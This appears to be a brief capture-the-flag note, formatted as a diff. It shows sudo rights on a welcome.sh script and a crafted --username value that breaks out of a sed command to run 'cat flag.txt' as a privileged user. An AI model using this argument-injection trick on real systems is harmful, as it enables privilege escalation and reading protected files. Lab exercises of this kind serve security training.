@@ -1,0 +1,6 @@
+sudo -l
+	User user1 may run the following commands on 20bed8bec38c:
+    	(user-privileged) NOPASSWD: /home/user1/welcome.sh
+
+welcome.sh
+	sudo -u user-privileged /home/user1/welcome.sh --name "id" --username "/g' foo.txt;cat flag.txt;sed 's/user/" -p 1
